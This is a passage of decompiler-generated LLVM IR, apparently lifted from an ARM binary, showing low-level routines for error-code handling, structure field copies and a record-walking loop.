  store i32 %v2_18384, i32* %v7_18390, align 4
  br label %dec_label_pc_183d0

dec_label_pc_18398:                               ; preds = %dec_label_pc_18338
  %v0_18398 = load i32, i32* @sb, align 4
  %v1_18398 = add i32 %v0_18398, 4
  store i32 %v1_18398, i32* %r3.global-to-local, align 4
  %v0_1839c = load i32, i32* @r6, align 4
  %v3_1839c = icmp ult i32 %v0_1839c, %v1_18398
  br i1 %v3_1839c, label %dec_label_pc_183ac, label %dec_label_pc_18398.dec_label_pc_183a4_crit_edge

dec_label_pc_18398.dec_label_pc_183a4_crit_edge:  ; preds = %dec_label_pc_18398
  %v0_183a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_183a4

dec_label_pc_183a4:                               ; preds = %dec_label_pc_18398.dec_label_pc_183a4_crit_edge, %dec_label_pc_18304
  %v0_183a4 = phi i32 [ %v0_183a4.pre, %dec_label_pc_18398.dec_label_pc_183a4_crit_edge ], [ %v0_1810c, %dec_label_pc_18304 ]
  store i32 %v0_183a4, i32* @r4, align 4
  br label %dec_label_pc_183d0

dec_label_pc_183ac:                               ; preds = %dec_label_pc_18398
  %v1_183ac = add i32 %v0_18398, -7
  store i32 %v1_183ac, i32* %r0.global-to-local, align 4
  %v1_183b0 = call i32 @function_12b00(i32 %v1_183ac)
  store i32 %v1_183b0, i32* @r0, align 4
  store i32 %v1_183b0, i32* @r4, align 4
  %v2_183b4 = icmp eq i32 %v1_183b0, 0
  br i1 %v2_183b4, label %dec_label_pc_183d0, label %dec_label_pc_183bc

dec_label_pc_183bc:                               ; preds = %dec_label_pc_183ac
  %v0_183bc = load i32, i32* @r6, align 4
  %v1_183bc = add i32 %v0_183bc, -8
  store i32 %v1_183bc, i32* @r2, align 4
  %v0_183c0 = load i32, i32* @r5, align 4
  store i32 %v0_183c0, i32* @r1, align 4
  %v0_183c4 = call i32 @function_12050()
  %v0_183c8 = load i32, i32* @r5, align 4
  store i32 %v0_183c8, i32* @r0, align 4
  %v0_183cc = call i32 @function_13684()
  store i32 %v0_183cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183d0

dec_label_pc_183d0:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_183ac, %dec_label_pc_183a4, %dec_label_pc_182fc, %.thread6, %dec_label_pc_1816c, %dec_label_pc_183bc
  store i32 %v2_180c0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r2.global-to-local, align 4
  %v4_183e0 = load i32, i32* inttoptr (i32 144340 to i32*), align 4
  store i32 %v4_183e0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_183e0)
  br label %dec_label_pc_183ec

dec_label_pc_183ec:                               ; preds = %dec_label_pc_180f4, %dec_label_pc_1809c, %dec_label_pc_18084, %dec_label_pc_183d0
  %v0_183ec = load i32, i32* @r4, align 4
  store i32 %v0_183ec, i32* %r0.global-to-local, align 4
  store i32 %v3_18064, i32* @r4, align 4
  store i32 %v6_18064, i32* @r5, align 4
  store i32 %v9_18064, i32* @r6, align 4
  store i32 %v12_18064, i32* @r7, align 4
  store i32 %v15_18064, i32* @r8, align 4
  store i32 %v18_18064, i32* @sb, align 4
  store i32 %v21_18064, i32* @sl, align 4
  store i32 %v24_18064, i32* @fp, align 4
  store i32 %v27_18064, i32* @lr, align 4
  ret i32 %v0_183ec

; uselistorder directives
  uselistorder i32 %v2_18384, { 1, 0, 2 }
  uselistorder i32 %v2_1836c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18348, { 1, 0, 2 }
  uselistorder i32 %v3_18328, { 1, 0, 2, 3 }
  uselistorder i32 %v1_182cc, { 2, 1, 0 }
  uselistorder i32 %v2_1829c, { 1, 0, 2 }
  uselistorder i32 %v0_18230, { 1, 0 }
  uselistorder i32 %v1_181ec, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_18150, { 0, 2, 1, 3 }
  uselistorder i32 %v2_18148, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_1812c, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_18124, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_18120, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_18110, { 1, 0 }
  uselistorder i32 %v0_1810c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_180ec, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 30, 6, 11, 7, 8, 9, 10, 22, 12, 14, 13, 15, 21, 23, 16, 17, 18, 19, 20, 26, 25, 24, 27, 29, 28 }
  uselistorder i32 860, { 0, 2, 1, 3 }
  uselistorder i32 5, { 0, 9, 5, 13, 10, 6, 17, 7, 14, 8, 1, 15, 16, 11, 2, 3, 12, 4 }
  uselistorder i32 ()* @function_13900, { 6, 2, 1, 5, 4, 0, 3 }
  uselistorder i32* inttoptr (i32 144348 to i32*), { 2, 1, 17, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 3 }
  uselistorder i32 11, { 9, 6, 7, 8, 18, 10, 3, 4, 5, 11, 12, 13, 14, 15, 16, 0, 17, 2, 1 }
  uselistorder i32* inttoptr (i32 144332 to i32*), { 0, 2, 1 }
  uselistorder i32 ()* @function_13684, { 11, 10, 9, 8, 7, 6, 14, 13, 12, 1, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32)* @function_12b00, { 17, 16, 15, 14, 13, 12, 11, 18, 1, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32* @fp, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 80, 82, 81, 83, 43, 44, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 35, 36 }
  uselistorder i32* @sl, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 36, 37, 38, 0, 39, 40, 41, 42, 43, 44, 46, 1, 45, 48, 47, 49, 50, 51, 52, 32, 33, 34, 35, 18, 19, 20, 21, 22, 23, 2, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_183ec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_183d0, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_182fc, { 1, 0 }
  uselistorder label %dec_label_pc_1829c, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_181e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_181dc, { 1, 0 }
  uselistorder label %dec_label_pc_181d8, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_18400(i32 %arg1) local_unnamed_addr {
dec_label_pc_18400:
  %v0_18400 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18400, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_18400
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_18400, %bb
  %v10_18414 = phi i32 [ %arg1, %dec_label_pc_18400 ], [ 0, %bb ]
  ret i32 %v10_18414

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_18418(i32 %arg1) local_unnamed_addr {
dec_label_pc_18418:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 144312, i32* %r2.global-to-local, align 4
  %v4_18424 = load i32, i32* inttoptr (i32 144416 to i32*), align 32
  %v4_1842c = load i32, i32* inttoptr (i32 144380 to i32*), align 4
  store i32 %v4_1842c, i32* %r1.global-to-local, align 4
  %v1_18430 = add i32 %arg1, 44
  %v2_18430 = inttoptr i32 %v1_18430 to i32*
  %v3_18430 = load i32, i32* %v2_18430, align 4
  %v1_18434 = add i32 %arg1, 28
  %v2_18434 = inttoptr i32 %v1_18434 to i32*
  %v3_18434 = load i32, i32* %v2_18434, align 4
  store i32 %v3_18434, i32* %r2.global-to-local, align 4
  %v2_18438 = inttoptr i32 %v4_18424 to i32*
  store i32 %v3_18430, i32* %v2_18438, align 4
  %v0_1843c = load i32, i32* %r2.global-to-local, align 4
  %v1_1843c = load i32, i32* %r1.global-to-local, align 4
  %v2_1843c = inttoptr i32 %v1_1843c to i32*
  store i32 %v0_1843c, i32* %v2_1843c, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_18448(i32 %arg1) local_unnamed_addr {
dec_label_pc_18448:
  %v0_18448 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18448, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18448
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18448, %bb
  %v4_1844c = phi i32 [ %arg1, %dec_label_pc_18448 ], [ 0, %bb ]
  ret i32 %v4_1844c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_18450(i32 %arg1) local_unnamed_addr {
dec_label_pc_1848c:
  store i32 %arg1, i32* @global_var_2976c.414, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* @global_var_2976c.414, { 1, 0, 2 }
}

define i32 @function_18498(i16* %arg1) local_unnamed_addr {
dec_label_pc_18498:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_18498 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18498, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_18498
  %v1_18498 = load i32, i32* @r6, align 4
  %v2_18498 = trunc i32 %v1_18498 to i16
  store i16 %v2_18498, i16* %arg1, align 2
  %v5_18498 = load i32, i32* @r4, align 4
  %v6_18498 = load i32, i32* %r0.global-to-local, align 4
  %v7_18498 = sub i32 %v6_18498, %v5_18498
  store i32 %v7_18498, i32* %r0.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_18498, %bb
  %v1_1849c = phi i32 [ %tmp, %dec_label_pc_18498 ], [ %v7_18498, %bb ]
  ret i32 %v1_1849c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_184a8() local_unnamed_addr {
dec_label_pc_184a8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_4()
  %tmp4 = call i16 @__decompiler_undefined_function_4()
  %tmp5 = call i16 @__decompiler_undefined_function_4()
  %tmp6 = call i16 @__decompiler_undefined_function_4()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %v3_184a8 = load i32, i32* @r7, align 4
  %v6_184a8 = load i32, i32* @lr, align 4
  %v2_184ac = ptrtoint i32* %stack_var_-72 to i32
  %v0_184b0 = load i32, i32* @r1, align 4
  store i32 %v0_184b0, i32* @r3, align 4
  store i32 %v2_184ac, i32* %r1.global-to-local, align 4
  %v0_184c0 = load i32, i32* @r0, align 4
  store i32 %v0_184c0, i32* %r7.global-to-local, align 4
  %tmp32 = icmp ult i32 %v0_184c0, -4095
  br i1 %tmp32, label %dec_label_pc_184e0, label %dec_label_pc_184cc

dec_label_pc_184cc:                               ; preds = %dec_label_pc_184a8
  %v0_184cc = call i32 @function_1095c()
  %v0_184d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_184d0 = sub i32 0, %v0_184d0
  store i32 %v1_184d0, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_184d8 = inttoptr i32 %v0_184cc to i32*
  store i32 %v1_184d0, i32* %v2_184d8, align 4
  %v0_184f0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_184f0

dec_label_pc_184e0:                               ; preds = %dec_label_pc_184a8
  %v2_184e0 = icmp eq i32 %v0_184c0, 0
  store i32 99568, i32* %lr.global-to-local, align 4
  br i1 %v2_184e0, label %dec_label_pc_18678, label %dec_label_pc_184f0

dec_label_pc_184f0:                               ; preds = %dec_label_pc_184e0, %dec_label_pc_184cc
  %v0_184f0 = phi i32 [ %v0_184f0.pre, %dec_label_pc_184cc ], [ %v0_184c0, %dec_label_pc_184e0 ]
  store i32 %v3_184a8, i32* @r7, align 4
  store i32 %v6_184a8, i32* @lr, align 4
  ret i32 %v0_184f0

dec_label_pc_18678:                               ; preds = %dec_label_pc_184e0
  %v3_18678 = load i32, i32* @r4, align 4
  %v6_18678 = load i32, i32* @r5, align 4
  %v9_18678 = load i32, i32* @r6, align 4
  %v15_18678 = load i32, i32* @r8, align 4
  %v18_18678 = load i32, i32* @sb, align 4
  store i32 %v0_184b0, i32* %r5.global-to-local, align 4
  store i32 %v2_184ac, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_18694 = inttoptr i32 %v0_184b0 to i8*
  %v3_18694 = call i32 @function_11f30(i8* %v2_18694, i32 0)
  %v2_1869c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1869c, i32* %r8.global-to-local, align 4
  %v1_186a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_186a0 = add i32 %v1_186a0, 12
  %v3_186a0 = inttoptr i32 %v2_186a0 to i32*
  %v1_186ac = load i32, i32* %r5.global-to-local, align 4
  %v2_186ac = add i32 %v1_186ac, 44
  %v3_186ac = inttoptr i32 %v2_186ac to i32*
  %v1_186b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_186b4 = add i32 %v1_186b4, 48
  %v3_186b4 = inttoptr i32 %v2_186b4 to i32*
  %v1_186bc = load i32, i32* %r5.global-to-local, align 4
  %v2_186bc = add i32 %v1_186bc, 52
  %v3_186bc = inttoptr i32 %v2_186bc to i32*
  %v0_186c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_186c8 = add i32 %v0_186c8, 56
  %v1_186cc = inttoptr i32 %v1_186c8 to i32*
  %v3_186cc = add i32 %v0_186c8, 60
  %v4_186cc = inttoptr i32 %v3_186cc to i32*
  %v5_186cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_186cc, i32* %v4_186cc, align 4
  %v0_186d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_186d8 = add i32 %v0_186d8, 64
  %v1_186dc = inttoptr i32 %v1_186d8 to i32*
  %v3_186dc = add i32 %v0_186d8, 68
  %v4_186dc = inttoptr i32 %v3_186dc to i32*
  %v5_186dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_186dc, i32* %v4_186dc, align 4
  %v4_186e8 = zext i16 %tmp6 to i32
  store i32 %v4_186e8, i32* %r2.global-to-local, align 4
  %v4_186ec = zext i16 %tmp5 to i32
  store i32 %v4_186ec, i32* %ip.global-to-local, align 4
  %v4_186f0 = zext i16 %tmp4 to i32
  store i32 %v4_186f0, i32* %lr.global-to-local, align 4
  %v4_186f4 = zext i16 %tmp to i32
  store i32 %v4_186f4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_18700 = load i32, i32* %r5.global-to-local, align 4
  %v1_18700 = add i32 %v0_18700, 72
  store i32 %v1_18700, i32* @r3, align 4
  %v1_18704 = inttoptr i32 %v1_18700 to i32*
  store i32 %tmp28, i32* %v1_18704, align 4
  %v3_18704 = add i32 %v0_18700, 76
  %v4_18704 = inttoptr i32 %v3_18704 to i32*
  %v5_18704 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_18704, i32* %v4_18704, align 4
  %v0_18708 = load i32, i32* %r5.global-to-local, align 4
  %v1_18708 = inttoptr i32 %v0_18708 to i32*
  %v2_18708 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_18708, i32* %v1_18708, align 4
  %v3_18708 = add i32 %v0_18708, 4
  %v4_18708 = inttoptr i32 %v3_18708 to i32*
  %v5_18708 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_18708, i32* %v4_18708, align 4
  %v0_1870c = load i32, i32* %r6.global-to-local, align 4
  %v1_1870c = load i32, i32* %r5.global-to-local, align 4
  %v2_1870c = add i32 %v1_1870c, 32
  %v3_1870c = inttoptr i32 %v2_1870c to i32*
  store i32 %v0_1870c, i32* %v3_1870c, align 4
  %v0_18710 = load i32, i32* %r7.global-to-local, align 4
  %v1_18710 = load i32, i32* %r5.global-to-local, align 4
  %v2_18710 = add i32 %v1_18710, 36
  %v3_18710 = inttoptr i32 %v2_18710 to i32*
  store i32 %v0_18710, i32* %v3_18710, align 4
  %v0_18714 = load i32, i32* %r2.global-to-local, align 4
  %v1_18714 = load i32, i32* %r5.global-to-local, align 4
  %v2_18714 = add i32 %v1_18714, 16
  %v3_18714 = inttoptr i32 %v2_18714 to i32*
  store i32 %v0_18714, i32* %v3_18714, align 4
  %v0_18718 = load i32, i32* %ip.global-to-local, align 4
  %v1_18718 = load i32, i32* %r5.global-to-local, align 4
  %v2_18718 = add i32 %v1_18718, 20
  %v3_18718 = inttoptr i32 %v2_18718 to i32*
  store i32 %v0_18718, i32* %v3_18718, align 4
  %v0_1871c = load i32, i32* %lr.global-to-local, align 4
  %v1_1871c = load i32, i32* %r5.global-to-local, align 4
  %v2_1871c = add i32 %v1_1871c, 24
  %v3_1871c = inttoptr i32 %v2_1871c to i32*
  store i32 %v0_1871c, i32* %v3_1871c, align 4
  %v0_18720 = load i32, i32* %r4.global-to-local, align 4
  %v1_18720 = load i32, i32* %r5.global-to-local, align 4
  %v2_18720 = add i32 %v1_18720, 28
  %v3_18720 = inttoptr i32 %v2_18720 to i32*
  store i32 %v0_18720, i32* %v3_18720, align 4
  store i32 %v3_18678, i32* @r4, align 4
  store i32 %v6_18678, i32* @r5, align 4
  store i32 %v9_18678, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v15_18678, i32* @r8, align 4
  store i32 %v18_18678, i32* @sb, align 4
  store i32 99568, i32* @lr, align 4
  ret i32 %tmp28

; uselistorder directives
  uselistorder i32 %v0_184c0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_184b0, { 1, 0, 2 }
  uselistorder i32 %tmp28, { 1, 0 }
  uselistorder i32 36, { 33, 6, 0, 1, 7, 2, 4, 34, 8, 9, 13, 10, 14, 11, 15, 12, 16, 24, 25, 23, 26, 27, 28, 29, 30, 31, 18, 19, 20, 21, 17, 22, 32, 3, 35, 36, 5 }
  uselistorder i32 76, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 72, { 4, 0, 1, 2, 7, 3, 5, 6 }
  uselistorder i32 60, { 1, 2, 3, 4, 0 }
  uselistorder i32 48, { 15, 0, 1, 5, 6, 7, 16, 2, 8, 17, 18, 19, 3, 9, 20, 22, 10, 11, 12, 23, 24, 25, 21, 13, 14, 4 }
  uselistorder i32 (i8*, i32)* @function_11f30, { 0, 1, 5, 2, 3, 43, 42, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 39, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41 }
  uselistorder i32* @sb, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 54, 57, 55, 56, 58, 51, 52, 43, 44, 45, 46, 47, 48, 49, 0, 50, 53 }
  uselistorder i32* @r8, { 6, 7, 11, 12, 3, 13, 14, 15, 16, 17, 18, 19, 20, 21, 8, 9, 10, 22, 23, 4, 24, 45, 46, 47, 48, 49, 5, 50, 51, 52, 53, 54, 55, 56, 57, 43, 44, 27, 28, 29, 30, 31, 2, 32, 1, 33, 34, 35, 25, 26, 36, 37, 38, 39, 40, 41, 0, 42 }
}

define i32 @function_18730(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_18730:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18764, label %dec_label_pc_18754

dec_label_pc_18754:                               ; preds = %dec_label_pc_18730
  %v0_18754 = call i32 @function_1095c()
  %v0_18758 = load i32, i32* %r4.global-to-local, align 4
  %v1_18758 = sub i32 0, %v0_18758
  %v2_1875c = inttoptr i32 %v0_18754 to i32*
  store i32 %v1_18758, i32* %v2_1875c, align 4
  br label %dec_label_pc_18764

dec_label_pc_18764:                               ; preds = %dec_label_pc_18730, %dec_label_pc_18754
  %v1_1876c = phi i32 [ %arg1, %dec_label_pc_18730 ], [ -1, %dec_label_pc_18754 ]
  ret i32 %v1_1876c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18764, { 1, 0 }
}

define i32 @function_18770(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_18770:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_18774 = load i32, i32* @r4, align 4
  %v6_18774 = load i32, i32* @r5, align 4
  %v12_18774 = load i32, i32* @r7, align 4
  %v1_18778 = add i32 %arg3, 14
  %v2_18780 = ptrtoint i32* %stack_var_-72 to i32
  %v1_18784 = and i32 %v1_18778, -8
  %v2_18788 = sub i32 %v2_18780, %v1_18784
  %v1_1878c = add i32 %v2_18788, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_1878c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_187c8, label %dec_label_pc_187b4

dec_label_pc_187b4:                               ; preds = %dec_label_pc_18770
  %v0_187b4 = call i32 @function_1095c()
  %v0_187b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_187b8 = sub i32 0, %v0_187b8
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_187c0 = inttoptr i32 %v0_187b4 to i32*
  store i32 %v1_187b8, i32* %v2_187c0, align 4
  %v0_187d0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_187d0

dec_label_pc_187c8:                               ; preds = %dec_label_pc_18770
  br i1 false, label %dec_label_pc_187d0, label %dec_label_pc_187d8

dec_label_pc_187d0:                               ; preds = %dec_label_pc_187c8, %dec_label_pc_187b4
  %v0_187d0 = phi i32 [ -1, %dec_label_pc_187c8 ], [ %v0_187d0.pre, %dec_label_pc_187b4 ]
  store i32 %v0_187d0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_188a4

dec_label_pc_187d8:                               ; preds = %dec_label_pc_187c8
  %v2_187d8 = add i32 %v1_1878c, %arg1
  %v2_187dc = add i32 %tmp, %arg3
  store i32 %v2_187dc, i32* @ip, align 4
  store i32 %v1_1878c, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1888c

dec_label_pc_187f8:                               ; preds = %dec_label_pc_1888c
  %v1_187f8 = add i32 %v0_1884c, 16
  %v2_187f8 = inttoptr i32 %v1_187f8 to i16*
  %v3_187f8 = load i16, i16* %v2_187f8, align 2
  %v4_187f8 = zext i16 %v3_187f8 to i32
  %v1_187fc = add nuw nsw i32 %v4_187f8, 7
  %v1_18800 = and i32 %v1_187fc, 131064
  store i32 %v1_18800, i32* %r2.global-to-local, align 4
  %v2_18808 = add i32 %v1_18800, %v0_18854
  store i32 %v2_18808, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_18808, %v2_187dc
  br i1 %tmp26, label %dec_label_pc_18814, label %dec_label_pc_18848

dec_label_pc_18814:                               ; preds = %dec_label_pc_187f8
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1881c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1881c, i32* %r2.global-to-local, align 4
  %v0_18820 = load i32, i32* %sl.global-to-local, align 4
  %v1_18824 = load i32, i32* @sp, align 4
  %v2_18824 = inttoptr i32 %v1_18824 to i32*
  store i32 0, i32* %v2_18824, align 4
  %v4_18828 = call i32 @function_18c48(i32 %arg1, i32 0, i32 %v0_1881c, i32 %v0_18820)
  %v0_1882c = load i32, i32* @r5, align 4
  %v1_1882c = load i32, i32* %r6.global-to-local, align 4
  %v9_1882c = icmp eq i32 %v0_1882c, %v1_1882c
  br i1 %v9_1882c, label %dec_label_pc_18834, label %dec_label_pc_188a0

dec_label_pc_18834:                               ; preds = %dec_label_pc_18814
  %v0_18834 = call i32 @function_1095c()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_18840 = inttoptr i32 %v0_18834 to i32*
  store i32 22, i32* %v2_18840, align 4
  %v0_188a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_188a4

dec_label_pc_18848:                               ; preds = %dec_label_pc_187f8
  %v1_18848 = inttoptr i32 %v0_1884c to i32*
  %v2_18848 = load i32, i32* %v1_18848, align 4
  %v3_18848 = add i32 %v0_1884c, 4
  %v4_18848 = inttoptr i32 %v3_18848 to i32*
  %v5_18848 = load i32, i32* %v4_18848, align 4
  store i32 %v5_18848, i32* %r4.global-to-local, align 4
  %v1_1884c = add i32 %v0_1884c, 8
  store i32 %v1_1884c, i32* %sb.global-to-local, align 4
  %v1_18850 = inttoptr i32 %v1_1884c to i32*
  %v2_18850 = load i32, i32* %v1_18850, align 4
  store i32 %v2_18850, i32* %sb.global-to-local, align 4
  %v3_18850 = add i32 %v0_1884c, 12
  %v4_18850 = inttoptr i32 %v3_18850 to i32*
  %v5_18850 = load i32, i32* %v4_18850, align 4
  store i32 %v5_18850, i32* %sl.global-to-local, align 4
  %v1_18854 = inttoptr i32 %v0_18854 to i32*
  store i32 %v2_18848, i32* %v1_18854, align 4
  %v3_18854 = add i32 %v0_18854, 4
  %v4_18854 = inttoptr i32 %v3_18854 to i32*
  %v5_18854 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18854, i32* %v4_18854, align 4
  %v0_18858 = load i32, i32* @r7, align 4
  %v1_18858 = add i32 %v0_18858, 8
  %v1_1885c = inttoptr i32 %v1_18858 to i32*
  %v2_1885c = load i32, i32* %v1_1885c, align 4
  %v3_1885c = add i32 %v0_18858, 12
  %v4_1885c = inttoptr i32 %v3_1885c to i32*
  %v5_1885c = load i32, i32* %v4_1885c, align 4
  store i32 %v5_1885c, i32* @r4, align 4
  %v1_18860 = load i32, i32* @r5, align 4
  %v2_18860 = add i32 %v1_18860, 8
  %v3_18860 = inttoptr i32 %v2_18860 to i32*
  store i32 %v2_1885c, i32* %v3_18860, align 4
  %v0_18864 = load i32, i32* @r4, align 4
  %v1_18864 = load i32, i32* @r5, align 4
  %v2_18864 = add i32 %v1_18864, 12
  %v3_18864 = inttoptr i32 %v2_18864 to i32*
  store i32 %v0_18864, i32* %v3_18864, align 4
  %v0_18868 = load i32, i32* %r2.global-to-local, align 4
  %v1_18868 = trunc i32 %v0_18868 to i16
  %v2_18868 = load i32, i32* @r5, align 4
  %v3_18868 = add i32 %v2_18868, 16
  %v4_18868 = inttoptr i32 %v3_18868 to i16*
  store i16 %v1_18868, i16* %v4_18868, align 2
  %v0_1886c = load i32, i32* @r7, align 4
  %v1_1886c = add i32 %v0_1886c, 18
  %v2_1886c = inttoptr i32 %v1_1886c to i8*
  %v3_1886c = load i8, i8* %v2_1886c, align 1
  %v4_1886c = zext i8 %v3_1886c to i32
  store i32 %v4_1886c, i32* @r3, align 4
  %v2_18870 = load i32, i32* @r5, align 4
  %v3_18870 = add i32 %v2_18870, 18
  %v4_18870 = inttoptr i32 %v3_18870 to i8*
